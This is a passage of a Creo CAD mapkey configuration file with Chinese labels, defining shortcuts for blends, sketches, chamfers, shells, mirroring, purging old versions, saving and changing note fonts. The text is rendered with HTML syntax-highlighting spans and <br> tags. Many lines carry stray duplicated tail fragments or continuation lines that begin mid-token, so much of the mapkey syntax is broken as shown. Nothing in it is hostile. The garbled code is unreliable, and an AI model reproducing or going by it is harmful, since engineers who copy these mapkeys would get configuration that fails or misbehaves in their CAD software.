`0`;\<br>mapkey(continued) ~ Trigger `extrev_1_placement.<span class="hljs-number">0.0</span>` `PH.section_select_list` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `extrev_1_placement.<span class="hljs-number">0.0</span>` `PH.Sketch`;\<br>mapkey(continued) ~ Move `Odui_Dlg_01` `Odui_Dlg_01` <span class="hljs-number">2</span> <span class="hljs-number">13.904203</span> <span class="hljs-number">7.280547</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `Odui_Dlg_01` `t1.PlnMru` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;` ``;</span><br>mapkey swbl @MAPKEY_LABEL扫描混合<span class="hljs-comment">;~ Command `ProCmdFtSweptBlend` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.swpbln_ref.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `swpbln_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `0` `Trajectories`;\<br>mapkey(continued) ~ Trigger `swpbln_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `swpbln_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `swpbln_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `0` `Trajectories`;\<br>mapkey(continued) ~ Trigger `swpbln_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.swpbln_sections_panel.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `swpbln_sections_panel.<span class="hljs-number">0.0</span>` `PH.SecTable` <span class="hljs-number">2</span> `0` `Sections`;\<br>mapkey(continued) ~ Trigger `swpbln_sections_panel.<span class="hljs-number">0.0</span>` `PH.SecTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `swpbln_sections_panel.<span class="hljs-number">0.0</span>` `PH.SecTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;</span><br>mapkey bl @MAPKEY_LABEL混合<span class="hljs-comment">;~ Command `ProCmdFtPBlend` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.blend_sectionspage.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `0` \<br>mapkey(continued) `BlendSections`;\<br>mapkey(continued) ~ Arm `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `0` `BlendSections`;\<br>mapkey(continued) ~ Disarm `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `0` `BlendSections`;\<br>mapkey(continued) ~ Select `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `0` `BlendSections`;\<br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;` ``;</span><br>mapkey robl @MAPKEY_LABEL旋转混合<span class="hljs-comment">;~ Command `ProCmdFtRBlend` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.blend_sectionspage.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.blend_sec_table` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.sketch_repr_list` `0`;\<br>mapkey(continued) ~ Trigger `blend_sectionspage.<span class="hljs-number">0.0</span>` `PH.sketch_repr_list` ``<span class="hljs-comment">;pr_list` ``;</span><br>mapkey rec @MAPKEY_LABEL草绘矩形<span class="hljs-comment">;~ Command `ProCmdSketRectangle`  1;`  1;</span><br>mapkey cp @MAPKEY_LABEL中心圆<span class="hljs-comment">;~ Command `ProCmdSketCenterPoint`  1;oint`  1;</span><br>mapkey c3p @MAPKEY_LABEL三点画圆<span class="hljs-comment">;~ Command `ProCmdSketCir3Pnt`  1;ketCir3Pnt`  1;</span><br>mapkey c3t @MAPKEY_LABEL相切圆<span class="hljs-comment">;~ Command `ProCmdSketCir3Tng`  1;\</span><br>mapkey(continued) mdSketCir3Tng`  <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>mapkey co @MAPKEY_LABEL圆锥草绘<span class="hljs-comment">;~ Command `ProCmdSketConic`  1;;</span><br>mapkey pr @MAPKEY_LABEL草绘投影<span class="hljs-comment">;~ Command `ProCmdSketProject`  1; 1;</span><br>mapkey bobl @MAPKEY_LABEL边界混合<span class="hljs-comment">;~ Command `ProCmdFtBndBlend`;mdFtBndBlend`;</span><br>mapkey ec @MAPKEY_LABEL几何倒角<span class="hljs-comment">;~ Command `ProCmdChamferEdge` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.chamfer_setspg.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.rndchSets` `Set <span class="hljs-number">1</span>`;\<br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.rndchSets` `Set <span class="hljs-number">2</span>`;\<br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.rndchSets` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.rndchSets` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.References` `0`;\<br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.References` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.References` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `chamfer_setspg.<span class="hljs-number">0.0</span>` `PH.DimTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;2 `` ``;</span><br>mapkey rev @MAPKEY_LABEL旋转<span class="hljs-comment">;~ Command `ProCmdFtRevolve` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.revolve_1_placement.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `revolve_1_placement.<span class="hljs-number">0.0</span>` `PH.Sketch`;\<br>mapkey(continued) ~ Move `Odui_Dlg_01` `Odui_Dlg_01` <span class="hljs-number">2</span> <span class="hljs-number">21.814272</span> <span class="hljs-number">6.596285</span><span class="hljs-comment">;6285;</span><br>mapkey ribt @MAPKEY_LABEL轮廓筋<span class="hljs-comment">;~ Command `ProCmdPlrib` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.plrib_settings.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `plrib_settings.<span class="hljs-number">0.0</span>` `PH.sketchrepresentator_btn`;\<br>mapkey(continued) ~ Move `Odui_Dlg_01` `Odui_Dlg_01` <span class="hljs-number">2</span> <span class="hljs-number">11.167155</span> <span class="hljs-number">5.775171</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `Odui_Dlg_01` `t1.PlnMru` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;u` 2 `` ``;</span><br>mapkey ribp @MAPKEY_LABEL加强筋<span class="hljs-comment">;~ Command `ProCmdProfRib` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.rib_refs.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `rib_refs.<span class="hljs-number">0.0</span>` `PH.SketchName` `0`;\<br>mapkey(continued) ~ Trigger `rib_refs.<span class="hljs-number">0.0</span>` `PH.SketchName` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `rib_refs.<span class="hljs-number">0.0</span>` `PH.Sketch`;\<br>mapkey(continued) ~ Trigger `Odui_Dlg_01` `t1.PlnMru` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Move `Odui_Dlg_01` `Odui_Dlg_01` <span class="hljs-number">2</span> <span class="hljs-number">15.984360</span> <span class="hljs-number">6.979472</span><span class="hljs-comment">;.979472;</span><br>mapkey mi @MAPKEY_LABEL镜像几何<span class="hljs-comment">;~ Command `ProCmdFtMirror` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.mirror_feat_refer.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2` `0`;\<br>mapkey(continued) ~ Trigger `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2` `0`;\<br>mapkey(continued) ~ Focus `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2`;\<br>mapkey(continued) ~ Select `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `mirror_feat_refer.<span class="hljs-number">0.0</span>` `PH.List2` ``<span class="hljs-comment">; ``;</span><br>mapkey th @MAPKEY_LABEL曲面加厚<span class="hljs-comment">;~ Command `ProCmdFtThicken`;</span><br>mapkey in @MAPKEY_LABEL曲面相交<span class="hljs-comment">;~ Command `ProCmdFtIntersect` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.ipcrv_refs.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` `0`;\<br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` `1`;\<br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` `1`;\<br>mapkey(continued) ~ Focus `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList`;\<br>mapkey(continued) ~ Select `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` <span class="hljs-number">1</span> `1`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `CollectorWdg_FocusTimer`;\<br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `ipcrv_refs.<span class="hljs-number">0.0</span>` `PH.IpSelectList` ``<span class="hljs-comment">;pSelectList` ``;</span><br>mapkey so @MAPKEY_LABEL实体化<span class="hljs-comment">;~ Command `ProCmdFtPatch` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;uit`;<br>mapkey rem @MAPKEY_LABEL移除<span class="hljs-comment">;~ Command `ProCmdFtRemoveSrf` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;it`;<br>mapkey cup @MAPKEY_LABEL 通过点的曲线<span class="hljs-comment">;~ Command `ProCmdFtCrvTp` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.crv_tp_placement.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `crv_tp_placement.<span class="hljs-number">0.0</span>` `PH.pnts_tbl` <span class="hljs-number">2</span> `0` `pnts_tbl_coll`;\<br>mapkey(continued) ~ Trigger `crv_tp_placement.<span class="hljs-number">0.0</span>` `PH.pnts_tbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `crv_tp_placement.<span class="hljs-number">0.0</span>` `PH.pnts_tbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;bl` 2 `` ``;</span><br>mapkey cue @MAPKEY_LABEL方程曲线<span class="hljs-comment">;~ Command `ProCmdFtCrvEqn` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.crv_fr_eq_reference.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `crv_fr_eq_reference.<span class="hljs-number">0.0</span>` `PH.csysrep_list` `0`;\<br>mapkey(continued) ~ Focus `crv_fr_eq_reference.<span class="hljs-number">0.0</span>` `PH.csysrep_list`;\<br>mapkey(continued) ~ Select `crv_fr_eq_reference.<span class="hljs-number">0.0</span>` `PH.csysrep_list` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `crv_fr_eq_reference.<span class="hljs-number">0.0</span>` `PH.csysrep_list` ``<span class="hljs-comment">;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;~ Activate `main_dlg_cur` `maindashInst0.EquationPB`;\</span><br>mapkey(continued) t0.EquationPB`;<br>mapkey shw @MAPKEY_LABEL收缩包络<span class="hljs-comment">;~ Command `ProCmdOduiDsfShrinkwrap` ;\</span><br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.SWRef_Model` `0`;\<br>mapkey(continued) ~ Focus `main_dlg_cur` `maindashInst0.SWRef_Model`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `maindashInst0.SWRef_Model` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.SWRef_Model` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.Open_ref_model`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;open`;<br>mapkey swe @MAPKEY_LABEL扫描<span class="hljs-comment">;~ Command `ProCmdFtLoft` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.sweep_ref.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `DuMmY` `Trajectories`;\<br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `DuMmY` `XTraj`;\<br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `DuMmY` `Normal`;\<br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `DuMmY` `XTraj`;\<br>mapkey(continued) ~ Trigger `sweep_ref.<span class="hljs-number">0.0</span>` `PH.TrjTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;t`;<br>mapkey rou @MAPKEY_LABEL倒圆角<span class="hljs-comment">;~ Command `ProCmdRound` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.round_setspg.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;1;</span><br>mapkey she @MAPKEY_LABEL抽壳<span class="hljs-comment">;~ Command `ProCmdShell` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.shell_ref.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `DuMmY` `surfaces`;\<br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RefSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `DuMmY` `surfaces`;\<br>mapkey(continued) ~ FocusIn `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl`;\<br>mapkey(continued) ~ Focus `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl`;\<br>mapkey(continued) ~ Select `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `DuMmY` `surfaces`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `CollectorWdg_FocusTimer`;\<br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `shell_ref.<span class="hljs-number">0.0</span>` `PH.RefSrfTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `shell_ref.<span class="hljs-number">0.0</span>` `PH.RemSrfTbl`;l`;<br>mapkey dov @MAPKEY_LABEL删除旧版本<span class="hljs-comment">;~ Close `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Command `ProCmdFilePurge`;CmdFilePurge`;<br>mapkey sa @MAPKEY_LABEL保存<span class="hljs-comment">;~ Command `ProCmdModelSave` ;\</span><br>mapkey(continued) ~ Activate `file_saveas` `OK`;`;<br>mapkey end @MAPKEY_LABEL拭除未显示<span class="hljs-comment">;~ Close `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Command `ProCmdModelEraseNotDisp` <span class="hljs-comment">;~ Activate `file_erase_nd` `ok_pb`;\</span><br>mapkey(continued) e_nd` `ok_pb`;<br>mapkey spl @MAPKEY_LABEL草绘样条<span class="hljs-comment">;~ Command `ProCmdSketSpline`  1;1;</span><br>mapkey sv @MAPKEY_LABEL草绘视图<span class="hljs-comment">;~ Command `ProCmdViewSketchView`;hView`;</span><br>mapkey del @MAPKEY_LABEL删除<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.AssyTree` `node6`;\<br>mapkey(continued) ~ PopupOver `main_dlg_cur` `PM_PHTLeft.AssyTree` <span class="hljs-number">1</span> `PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Command `ProCmdEditDeleteFeat@PopupMenuTree` <span class="hljs-comment">;~ FocusIn `del_sup_msg` `ok`;\</span><br>mapkey(continued) ~ Activate `del_sup_msg` `ok`;ok`;<br>mapkey dia @MAPKEY_LABEL测量直径<span class="hljs-comment">;~ Command `ProCmdNaMeasureDiameter`;er`;</span><br>mapkey dis @MAPKEY_LABEL测量距离<span class="hljs-comment">;~ Command `ProCmdNaMeasureDistance`;ce`;</span><br>mapkey da @MAPKEY_LABEL拔模分析<span class="hljs-comment">;~ Command `ProCmdNaGeometryDraftCheck` ;\</span><br>mapkey(continued) ~ Open `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `Sst_bar.filter_list` <span class="hljs-number">1</span> `4`;\<br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `pull_rep_` `0`;\<br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `pull_rep_` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `surface_rep_` `0`;\<br>mapkey(continued) ~ Focus `n<span class="hljs-built_in">a_draft</span>_check` `surface_rep_`;\<br>mapkey(continued) ~ Select `n<span class="hljs-built_in">a_draft</span>_check` `surface_rep_` <span class="hljs-number">1</span> `0`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `CollectorWdg_FocusTimer`;\<br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `surface_rep_` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `surface_rep_` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `pull_rep_` `0`;\<br>mapkey(continued) ~ Trigger `n<span class="hljs-built_in">a_draft</span>_check` `pull_rep_` ``<span class="hljs-comment">;_rep_` ``;</span><br>mapkey offs @MAPKEY_LABEL偏移曲面<span class="hljs-comment">;~ Command `ProCmdFtOffset`;FtOffset`;</span><br>mapkey ofs @MAPKEY_LABEL偏移草绘<span class="hljs-comment">;~ Command `ProCmdSketOffset`  1;fset`  1;</span><br>mapkey cg @MAPKEY_LABEL复制发布几何<span class="hljs-comment">;~ Command `ProCmdOduiDsfCopyGeom` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.References.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.PGCheckButton` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.References.<span class="hljs-number">0</span>` <span class="hljs-number">0</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.References.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` `0`;\<br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` `0`;\<br>mapkey(continued) ~ Focus `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model`;\<br>mapkey(continued) ~ Select `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` <span class="hljs-number">1</span> `0`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `CollectorWdg_FocusTimer`;\<br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `References.<span class="hljs-number">1.0</span>` `PH.Ref_Model` ``<span class="hljs-comment">;el` ``;</span><br>mapkey hi @MAPKEY_LABEL隐藏几何<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.AssyTree` `node2`;\<br>mapkey(continued) ~ PopupOver `main_dlg_cur` `PM_PHTLeft.AssyTree` <span class="hljs-number">1</span> `PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Command `ProCmdHideFeat_PushBtn@PopupMenuTree`;<br>mapkey mtr @MAPKEY_LABEL显示模型树<span class="hljs-comment">;~ Command `ProCmdMdlTreeFilter` ;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `feat_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `placement_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `note_btn` <span class="hljs-number">1</span><span class="hljs-comment">;~ Activate `mdl_filter` `section_btn` 1;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `supres_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `envelope_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `aber_btn` <span class="hljs-number">1</span><span class="hljs-comment">;~ Activate `mdl_filter` `apply`;\</span><br>mapkey(continued) ~ Activate `mdl_filter` `ok_btn`;btn`;<br>mapkey uhi @MAPKEY_LABEL取消隐藏<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.AssyTree` `node8`;\<br>mapkey(continued) ~ PopupOver `main_dlg_cur` `PM_PHTLeft.AssyTree` <span class="hljs-number">1</span> `PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `PM_PHTLeft.AssyTree`;\<br>mapkey(continued) ~ Command `ProCmdUnhideFeat_PushBtn@PopupMenuTree`;`;<br>mapkey fst @MAPKEY_LABEL标注改为仿宋<span class="hljs-comment">;~ Move `main_dlg_cur` `NoteEdit` 2 3 3;\</span><br>mapkey(continued) ~ Move `main_dlg_cur` `NoteEdit` <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Move `main_dlg_cur` `NoteEdit` <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Move `main_dlg_cur` `NoteEdit` <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">3</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `UIT_TRANSLUCENT` `NEED_TO_CLOSE`;\<br><span class="hljs-title">mapkey(continued) ~ Open `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont`;\<br><span class="hljs-title">mapkey(continued) ~ Trigger `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont` `triumi`;\<br><span class="hljs-title">mapkey(continued) ~ Trigger `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont` `kaiu`;\<br><span class="hljs-title">mapkey(continued) ~ Trigger `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont` `daunpenh`;\<br><span class="hljs-title">mapkey(continued) ~ Trigger `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont` `simfang`;\<br><span class="hljs-title">mapkey(continued) ~ Close `main_dlg_cur` `Text_Style:</span>ProCmdDtlSetTextFont`;\<br>mapkey(continued) ~ Command `ProCmdDtlSetTextFont`  `simfang`;ng`;<br>mapkey ren @MAPKEY_NAMErename<span class="hljs-comment">;@MAPKEY_LABEL重命名;\</span><br>mapkey(continued) ~ Close `main_dlg_cur` `appl_casc`;~ Command `ProCmdModelRename`;e`;<br>mapkey ddrw @MAPKEY_LABEL打开drw文件<span class="hljs-comment">;~ Command `ProCmdModelOpen` ;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Open `file_open` `Type`;~ Close `file_open` `Type`;\<br>mapkey(continued) ~ Select `file_open` `Type` <span class="hljs-number">1</span> `db_4`;<br>mapkey flipa @MAPKEY_LABEL反向箭头<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close 